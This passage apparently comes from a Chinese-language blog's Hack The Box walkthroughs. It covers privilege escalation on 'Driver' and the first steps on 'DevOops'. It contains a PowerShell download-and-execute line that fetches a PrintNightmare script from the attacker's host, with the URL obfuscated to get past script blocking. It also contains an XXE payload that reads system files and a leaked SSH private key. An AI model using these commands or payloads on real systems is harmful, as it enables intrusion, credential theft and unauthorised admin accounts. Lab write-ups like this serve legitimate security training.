class="hljs-literal">-1-1-0</span>      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Management Users        Alias            S<span class="hljs-literal">-1-5-32-580</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Users                          Alias            S<span class="hljs-literal">-1-5-32-545</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NETWORK                   Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Authenticated Users       Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\This Organization         Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Local account             Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-113</span>    Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NTLM Authentication       Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-64-10</span>  Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>Mandatory Label\Medium Mandatory Level Label            S<span class="hljs-literal">-1-16-8192</span><br><br><br>PRIVILEGES INFORMATION<br><span class="hljs-literal">----------------------</span><br><br>Privilege Name                Description                          State<br>============================= ==================================== =======<br>SeShutdownPrivilege           Shut down the system                 Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled<br>SeUndockPrivilege             Remove computer from docking station Enabled<br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>       Enabled<br>SeTimeZonePrivilege           Change the time zone                 Enabled<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\tony\Desktop&gt; <br></code></pre></td></tr></table></figure><p>但可以通过Metasploit枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 post(multi/recon/local_exploit_suggester) &gt; run<br><br>[*] 10.10.11.106 - Collecting <span class="hljs-built_in">local</span> exploits <span class="hljs-keyword">for</span> x64/windows...<br>[*] 10.10.11.106 - 32 exploit checks are being tried...<br>[+] 10.10.11.106 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.<br>[+] 10.10.11.106 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.<br>[+] 10.10.11.106 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.<br>[+] 10.10.11.106 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.<br>[+] 10.10.11.106 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.<br>[+] 10.10.11.106 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions<br>[+] 10.10.11.106 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.<br>[*] Post module execution completed<br></code></pre></td></tr></table></figure><p>有个驱动加载的漏洞，与靶机主题吻合。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sf6 exploit(windows/local/ricoh_driver_privesc) &gt; <span class="hljs-built_in">set</span> session 1<br>session =&gt; 1<br>msf6 exploit(windows/local/ricoh_driver_privesc) &gt; <span class="hljs-built_in">set</span> LPORT 4444<br>LPORT =&gt; 4444<br>msf6 exploit(windows/local/ricoh_driver_privesc) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.7:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target appears to be vulnerable. Ricoh driver directory has full permissions<br>[*] Adding printer gvYCW...<br>[*] Deleting printer gvYCW<br>[*] Exploit completed, but no session was created.<br></code></pre></td></tr></table></figure><p>但是没回弹会话。</p><h4 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h4><p>简单来讲，在windows系统中，如果要添加打印机驱动会被系统校验<strong>APD_INSTALL_WARNED_DRIVER</strong> 标志位，如果客户端尝试添加列表中的打印机驱动程序，但未设置此位，则服务器返回 ERROR_PRINTER_DRIVER_WARNED 错误代码。如果客户端尝试添加列表中的打印机驱动程序，并且设置了此位，则服务器尝试添加打印机驱动程序，而漏洞的本质便是低权限用户可以添加<strong>APD_INSTALL_WARNED_DRIVER</strong> 标志位使其让windows以驱动高权限加载用户的DLL。如需详细代码了解，请转以下文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">271241</span>.htm<br></code></pre></td></tr></table></figure><p>导入漏洞脚本被拦截了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\tony\Documents&gt; Import-Module .\CVE-2021-1675.ps1<br>File C:\Users\tony\Documents\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.<br>At line:1 char:1<br>+ Import-Module .\CVE-2021-1675.ps1<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException<br>    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand<br>*Evil-WinRM* PS C:\Users\tony\Documents&gt; . .\CVE-2021-1675.ps1<br>File C:\Users\tony\Documents\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.<br>At line:1 char:3<br>+ . .\CVE-2021-1675.ps1<br>+   ~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : SecurityError: (:) [], PSSecurityException<br>    + FullyQualifiedErrorId : UnauthorizedAccess<br>*Evil-WinRM* PS C:\Users\tony\Documents&gt; <br></code></pre></td></tr></table></figure><p>但是可以绕过，远程加载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Expression (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&quot;ht&quot;</span>+<span class="hljs-string">&quot;tp://10.10.16.7/\CVE-2021-1675.ps1&quot;</span>)<br>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Get-Command Invoke-Nightmare<br><br>CommandType     Name                                               Version    Source<br>-----------     ----                                               -------    ------<br>Function        Invoke-Nightmare<br></code></pre></td></tr></table></figure><p>我可以利用该脚本添加个用户，这个用户会在本地管理员组中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare -NewUser <span class="hljs-string">&quot;mosaic&quot;</span> -NewPassword <span class="hljs-string">&quot;adminadmin&quot;</span><br>[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll<br>[+] using pDriverPath = <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;</span><br>[+] added user mosaic as <span class="hljs-built_in">local</span> administrator<br>[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll<br>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net user mosaic<br>User name                    mosaic<br>Full Name                    mosaic<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            5/16/2022 9:26:38 AM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          5/16/2022 9:26:38 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   5/16/2022 9:28:03 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Administrators</span><br><span class="hljs-string">Global Group memberships     *None</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\tony\Documents&gt; </span><br></code></pre></td></tr></table></figure><p>以新身份进行winrm会话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; evil-winrm -i 10.10.11.106 -u mosaic -p adminadmin<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\mosaic\Documents&gt; <span class="hljs-built_in">whoami</span><br>driver\mosaic<br>*Evil-WinRM* PS C:\Users\mosaic\Documents&gt; <span class="hljs-built_in">cd</span> ../../<br>*Evil-WinRM* PS C:\Users&gt; <span class="hljs-built_in">cd</span> administrator<br>*Evil-WinRM* PS C:\Users\administrator&gt; <span class="hljs-built_in">cd</span> desktop<br>*Evil-WinRM* PS C:\Users\administrator\desktop&gt; <span class="hljs-built_in">type</span> root.txt<br>f8.........................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - DevOops</title>
    <link href="/post/HackTheBox-DevOops.html"/>
    <url>/post/HackTheBox-DevOops.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.91<br>Host is up (0.20s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)<br>|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)<br>|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:<span class="hljs-built_in">dd</span>:3c:1f:c0:37:0d:00 (ED25519)<br>5000/tcp open  http    Gunicorn 19.7.1<br>|_http-server-header: gunicorn/19.7.1<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds</span><br></code></pre></td></tr></table></figure><p>22端口眼熟了，除了用户名枚举没什么漏洞。接着看5000端口，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Gunicorn 19.7.1                 <br>Exploits: No Results<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>没什么漏洞信息。打开web页面，一张图片，几句话，没什么能供我向服务器发起请求的按钮或暗链，</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409150238288.png" alt="image-20220409150238288"  /><p>数据包中也没有什么信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1<br>Host: 10.10.10.91:5000<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>DNT: 1<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br></code></pre></td></tr></table></figure><p>这是靶场的源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Under construction!<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>      This is feed.py, which will become the MVP for Blogfeeder application. <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>  TODO: replace this with the proper feed from the dev.solita.fi backend.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/feed&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;60%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;60%&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看靶场提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">��正在施工🚧！<br><br>这是 feed.py，它将成为 Blogfeeder 应用程序的 MVP。<br><br>TODO：用来自 dev.solita.fi 后端的正确提要替换它。 <br></code></pre></td></tr></table></figure><p>我尝试去对目标进行路径爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://10.10.10.91:5000/             <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                     <br> (_||| _) (/_(_|| (_| )                                                                              <br>                                                                                                     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/10.10.10.91-5000/-_22-04-09_15-05-19.txt<br><br>Error Log: /root/.dirsearch/logs/errors-22-04-09_15-05-19.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.91:5000/<br><br>[15:05:19] Starting: <br>[15:07:14] 200 -  533KB - /feed                                             <br>[15:08:07] 200 -  347B  - /upload                                           <br>                                                                             <br>Task Completed     <br></code></pre></td></tr></table></figure><p>好吧feed就是那张图：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409151005306.png" alt="image-20220409151005306"  /><p>看第二个，我发现了上传功能：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409152646533.png" alt="image-20220409152646533"  /><p>我无法得知目标服务器的脚本语言环境，但看提示要我上传xml元素，而且需要主题，作者，项目等属性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;!DOCTYPE foo [<br>  &lt;!ELEMENT foo ANY&gt;<br>  &lt;!ENTITY bar SYSTEM<br>  <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>]&gt;<br><br>&lt;item&gt;<br>&lt;Author&gt;<br>  &amp;bar;<br>&lt;/Author&gt;<br>&lt;Subject&gt;hello&lt;/Subject&gt;<br>&lt;Content&gt;Hello World&lt;/Content&gt;<br>&lt;/item&gt;<br></code></pre></td></tr></table></figure><p>便于更改调试可用burpsuite拦截数据包，可以看到我成功了：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409161443303.png" alt="image-20220409161443303"  /><p>我可以读取到roosa的ssh私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7<br>9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J<br>R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk<br>v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4<br>9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K<br>m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS<br>JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz<br>ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB<br>lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3<br>koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7<br>e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe<br>8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ<br>Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6<br>NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93<br>hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0<br>ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk<br>A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw<br>agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R<br>KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v<br>vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0<br>8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn<br>y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl<br>aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG<br>xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq<br>82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa roosa@10.10.10.91<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>135 packages can be updated.<br>60 updates are security updates.<br><br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>roosa@gitter:~$ <span class="hljs-built_in">ls</span><br>deploy   Documents  examples.desktop  Pictures  run-blogfeed.sh  service.sh~  user.txt  work<br>Desktop  Downloads  Music             Public    service.sh       Templates    Videos<br>roosa@gitter:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure><p>这样我就获取到了user.txt，然后我找到了另一个RSA密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">roosa@gitter:~/work/blogfeed/resources/integration$ <span class="hljs-built_in">cat</span> authcredentials.key <br></code></pre></td></tr></table></figure><p>但是它并不能让我登录到root。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i isa root@10.10.10.91<br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.91 (10.10.10.91)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:TJX/SwHfUAVqwvzLYXblm927Axojlv6xA8QvnXf5ppE.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.91<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">Permissions 0644 for &#x27;</span>isa<span class="hljs-string">&#x27; are too open.</span><br><span class="hljs-string">It is required that your private key files are NOT accessible by others.</span><br><span class="hljs-string">This private key will be ignored.</span><br><span class="hljs-string">Load key &quot;isa&quot;: bad permissions</span><br><span class="hljs-string">root@10.10.10.91&#x27;</span>s password: <br>Permission denied, please try again.<br>root@10.10.10.91<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">root@10.10.10.91&#x27;</span>s password: <br>root@10.10.10.91: Permission denied (publickey,password).<br></code></pre></td></tr></table></figure><p>当前目录中还有一个.git文件夹，或许该用户之前用过git：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">roosa@gitter:~/work/blogfeed/.git<br></code></pre></td></tr></table></figure><p>当我查看git历史时候：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span> -p<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 